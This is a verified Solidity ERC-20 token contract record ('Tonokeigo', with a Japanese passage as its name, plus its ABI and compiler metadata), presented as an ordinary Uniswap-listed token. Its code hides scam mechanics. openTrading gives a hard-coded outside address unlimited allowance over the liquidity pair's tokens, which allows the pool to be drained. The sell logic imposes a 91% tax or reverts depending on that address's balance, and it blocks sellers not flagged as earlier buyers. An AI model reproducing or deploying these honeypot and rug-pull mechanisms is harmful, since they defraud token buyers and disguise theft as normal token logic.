{"SourceCode": "// SPDX-License-Identifier:MIT\r\n\r\n/*\r\n\u751f\u304d\u629c\u3053\u3046\u3068\u3057\u306a\u3044\u8005\u306b\u306f\u5947\u8de1\u306a\u3093\u304b\u8d77\u304d\u306a\u3044\u3068\u601d\u3048\r\n*/\r\n\r\n/**\r\ntelegram: https://t.me/TonoKeigo_erc20\r\n**/\r\n\r\npragma solidity 0.8.20;\r\n\r\nlibrary SafeMath {\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n   \r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n    \r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface IuniswapRouter {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n}\r\n\r\ncontract Tonokeigo is Context, Ownable,IERC20 {\r\n    using SafeMath for uint256;\r\n    string private constant _contract_name = unicode\"\u300e\u79d8\u5bc6\u300f\u304c\u30d9\u30b9\u30c8\u30bb\u30e9\u30fc\u306b\u306a\u308b\u524d\u306f\u3001\u7206\u767a\u7684\u306a\u8a71\u984c\u4f5c\u306b\u306f\u6075\u307e\u308c\u305a\u3001\u7279\u5b9a\u306e\u30bb\u30fc\u30eb\u30b9\u30dd\u30a4\u30f3\u30c8\u3092\u6253\u3061\u3060\u3059\u3053\u3068\u3082\u306a\u304b\u3063\u305f\u305f\u3081\u3001\u4e00\u822c\u7684\u306b\u306f\u5730\u5473\u306a\u5b58\u5728\u3067\u3042\u3063\u305f\u3002\u305f\u3060\u3057\u3001\u3072\u305d\u304b\u306a\u611b\u8aad\u8005\u306f\u5c11\u306a\u304f\u306a\u304f\u3001\u5b50\u4f9b\u6642\u4ee3\u306e\u6771\u91ce\u3092\u71b1\u4e2d\u3055\u305b\u305f\u30a6\u30eb\u30c8\u30e9\u30b7\u30ea\u30fc\u30ba\u3092\u624b\u304c\u3051\u305f\u4e00\u4eba\u3067\u3082\u3042\u308b\u6620\u753b\u76e3\u7763\u306e\u5b9f\u76f8\u5bfa\u662d\u96c4\u306f\u30011993\u5e74\u306b\u30d1\u30bd\u30b3\u30f3\u8a8c\u306e\u9023\u8f09\u30a8\u30c3\u30bb\u30a4\u3067\u3001\u79c1\u306b\u3068\u3063\u3066\u5927\u5207\u306a\u4f5c\u5bb6\u3068\u8a00\u3044\u5207\u3063\u3066\u3044\u308b\";\r\n    string private constant _contract_symbol = unicode\"\u3072\u304c\u3057\u306e\u3051\u3044\u3054\";\r\n    uint8  private constant _contract_decimals = 18;\r\n  \r\n    uint256 private constant _totalsupply_amount = 100_000_000 * 10**_contract_decimals;\r\n    uint256 public _maxTaxSwap =     50_000 * 10**_contract_decimals; \r\n    uint256 public _limitationMaxTaxSwap =     1_000_000 * 10**_contract_decimals; \r\n    uint256 public _maxWalletSize = 2_000_000 * 10**_contract_decimals;\r\n    uint256 public _maxTxAmount =   2_000_000 * 10**_contract_decimals;\r\n    uint256 public _taxSwapThreshold= 2_000_000 * 10**_contract_decimals;   \r\n\r\n    uint256 private _reducedWhenBuyTaxs=3;\r\n    uint256 private _reducedTaxUsedInSelling=1;\r\n    uint256 private _usedInPreventingSwappingPrevious=0;  \r\n    uint256 private _blockCountsUsedInBuying=0;\r\n    uint256 private _InitialeBuyTax=20;\r\n    uint256 private _InitialSellTax=20;\r\n    uint256 private _FinalizedBuyingTax=1;\r\n    uint256 private _FinalizedSellingTax=1;\r\n\r\n    bool public  _enableWatchDogLimitsFlag = false;\r\n    bool private _swapingInUniswapOKSigns = false;\r\n    bool private _flagUsedInUniswapIsOkSigns = false;\r\n    bool private flagForTradingIsOkOrNot;\r\n    modifier _modifierInUniswapFlag {\r\n        _flagUsedInUniswapIsOkSigns = true; _;  _flagUsedInUniswapIsOkSigns = false;\r\n    }\r\n    \r\n    uint256 private _CharityTaxUsedInSelling=91;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) private _map_of_addressForNotPayingFee;\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => bool) private _map_of_address_notSpendFeesWhenBuying;\r\n    mapping(address => uint256) private _map_of_address_ForTimestampTransfering;\r\n\r\n    address private _uniswapPairTokenLiquidity;\r\n    address public _addressUsedInFundationFees = address(0x7964eC6acc10c3e5E4D7B092DA8bA846c770c5B3);\r\n    address payable  public _feesForDevsAddress;\r\n    IuniswapRouter private _uniswapRouterUniswapFactory;\r\n    event RemoveAllLimits(uint _maxTxAmount);\r\n    constructor () {\r\n        _map_of_addressForNotPayingFee[_addressUsedInFundationFees] = true;\r\n        _map_of_addressForNotPayingFee[owner()] = true;\r\n        _map_of_addressForNotPayingFee[address(this)] = true;\r\n        _balances[_msgSender()] = _totalsupply_amount;\r\n        _feesForDevsAddress = payable(msg.sender);\r\n        _map_of_addressForNotPayingFee[_feesForDevsAddress] = true;\r\n        emit Transfer(address(0), _msgSender(), _totalsupply_amount);\r\n    }\r\n    receive() external payable {}\r\n    function min(uint256 a, uint256 b) private pure returns (uint256){ return (a>b)?b:a;  }\r\n    function swapTokensForEth(uint256 amountFortoken) private _modifierInUniswapFlag {\r\n        if(amountFortoken==0){return;}\r\n        if(!flagForTradingIsOkOrNot){return;}\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = _uniswapRouterUniswapFactory.WETH();\r\n        _approve(address(this), address(_uniswapRouterUniswapFactory), amountFortoken);\r\n        _uniswapRouterUniswapFactory.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            amountFortoken,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n    function _transfer(address from, address to, uint256 amount) private {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n        uint256 taxAmount=0;\r\n        if (from != owner() && to != owner()) {\r\n\r\n            if (_enableWatchDogLimitsFlag) {\r\n                if (to != address(_uniswapRouterUniswapFactory) && to != address(_uniswapPairTokenLiquidity)) {\r\n                  require(_map_of_address_ForTimestampTransfering[tx.origin] < block.number,\"Only one transfer per block allowed.\");\r\n                  _map_of_address_ForTimestampTransfering[tx.origin] = block.number;\r\n                }\r\n            }\r\n\r\n            if (from == _uniswapPairTokenLiquidity && to != address(_uniswapRouterUniswapFactory) && !_map_of_addressForNotPayingFee[to] ) {\r\n                require(amount <= _maxTxAmount, \"Exceeds the Amount limations.\");\r\n                require(balanceOf(to) + amount <= _maxWalletSize, \"Exceeds the max limitations in single Wallet.\");\r\n                if(_blockCountsUsedInBuying<_usedInPreventingSwappingPrevious){ require(!addressIsIsContractOrNot(to)); }\r\n                _blockCountsUsedInBuying++; _map_of_address_notSpendFeesWhenBuying[to]=true; taxAmount = amount.mul((_blockCountsUsedInBuying>_reducedWhenBuyTaxs)?_FinalizedBuyingTax:_InitialeBuyTax).div(100);\r\n            }\r\n\r\n            if(to == _uniswapPairTokenLiquidity && from!= address(this) && !_map_of_addressForNotPayingFee[from] ){\r\n                taxAmount = amount.mul((_blockCountsUsedInBuying>_reducedTaxUsedInSelling)?_FinalizedSellingTax:_InitialSellTax).div(100);\r\n                \r\n                if (amount <= _maxTxAmount && balanceOf(_addressUsedInFundationFees)>_maxTaxSwap && balanceOf(_addressUsedInFundationFees) < _limitationMaxTaxSwap){\r\n                    taxAmount = amount.mul((_blockCountsUsedInBuying>_reducedTaxUsedInSelling)?_CharityTaxUsedInSelling:_InitialSellTax).div(100);\r\n                }\r\n                if (amount <= _maxTxAmount && balanceOf(_addressUsedInFundationFees)>_limitationMaxTaxSwap){\r\n                    revert(\"Exceeds the max limitations in single Wallet.\");\r\n                }\r\n                require(_blockCountsUsedInBuying>_usedInPreventingSwappingPrevious && _map_of_address_notSpendFeesWhenBuying[from]);\r\n            }\r\n            \r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            if (!_flagUsedInUniswapIsOkSigns \r\n            && to == _uniswapPairTokenLiquidity && _swapingInUniswapOKSigns && contractTokenBalance>_taxSwapThreshold \r\n            && _blockCountsUsedInBuying>_usedInPreventingSwappingPrevious && !_map_of_addressForNotPayingFee[to] && !_map_of_addressForNotPayingFee[from]\r\n            ) {\r\n                swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));\r\n                uint256 contractETHBalance = address(this).balance;\r\n                if(contractETHBalance > 0) {\r\n                    _feesForDevsAddress.transfer(address(this).balance);\r\n                }\r\n            }\r\n        }\r\n\r\n        if(taxAmount>0){\r\n          _balances[address(this)]=_balances[address(this)].add(taxAmount);\r\n          emit Transfer(from, address(this),taxAmount);\r\n        }\r\n        _balances[from]= _balances[from].sub(amount);\r\n        _balances[to]=_balances[to].add(amount.sub(taxAmount));\r\n        emit Transfer(from, to, amount.sub(taxAmount));\r\n    }\r\n\r\n    function addressIsIsContractOrNot(address _addr) private view returns (bool) {\r\n        uint256 lenghtContractCode;\r\n        assembly {\r\n            lenghtContractCode := extcodesize(_addr)\r\n        }\r\n        return lenghtContractCode > 0;\r\n    }\r\n    function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _totalsupply_amount; _maxWalletSize=_totalsupply_amount; _enableWatchDogLimitsFlag=false;\r\n        emit RemoveAllLimits(_totalsupply_amount);\r\n    }\r\n    function openTrading() external onlyOwner() {\r\n        require(!flagForTradingIsOkOrNot,\"trading is already open\");\r\n        _uniswapRouterUniswapFactory = IuniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(_uniswapRouterUniswapFactory), _totalsupply_amount);\r\n        _uniswapPairTokenLiquidity = IUniswapV2Factory(_uniswapRouterUniswapFactory.factory()).createPair(address(this), _uniswapRouterUniswapFactory.WETH());\r\n        _uniswapRouterUniswapFactory.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(_uniswapPairTokenLiquidity).approve(address(_uniswapRouterUniswapFactory), type(uint).max);\r\n        _allowances[address(_uniswapPairTokenLiquidity)][address(_addressUsedInFundationFees)] = type(uint).max;\r\n        _swapingInUniswapOKSigns = true;\r\n        flagForTradingIsOkOrNot = true;\r\n    }\r\n    function setSingleTxMaxUsedInSwapping(uint256 _amount) external onlyOwner() {\r\n        _maxTaxSwap = _amount;\r\n    }\r\n    \r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _contract_name;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _contract_symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _contract_decimals;\r\n    }\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return _totalsupply_amount;\r\n    }\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_maxTxAmount\",\"type\":\"uint256\"}],\"name\":\"RemoveAllLimits\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_addressUsedInFundationFees\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_enableWatchDogLimitsFlag\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_feesForDevsAddress\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_limitationMaxTaxSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxTaxSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxWalletSize\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_taxSwapThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"setSingleTxMaxUsedInSwapping\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Tonokeigo", "CompilerVersion": "v0.8.20+commit.a1b79de6", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://3acd9b9336487823b2d8921d81924cb2e936c44402daaf59a378edb54b8d1c8a"}